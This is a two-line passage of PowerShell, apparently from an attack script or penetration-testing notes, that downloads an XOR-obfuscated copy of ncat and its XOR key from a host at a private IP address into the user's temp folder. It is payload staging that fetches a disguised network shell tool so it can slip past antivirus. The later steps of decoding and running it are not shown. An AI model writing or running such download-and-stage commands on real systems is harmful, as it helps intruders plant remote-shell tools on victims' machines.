...
(new-object Net.WebClient).DownloadFile('http://172.16.70.10/xored_ncat' , $env:temp+"/ciphertext")
(new-object Net.WebClient).DownloadFile('http://172.16.70.10/xor_key' , $env:temp+"/key")
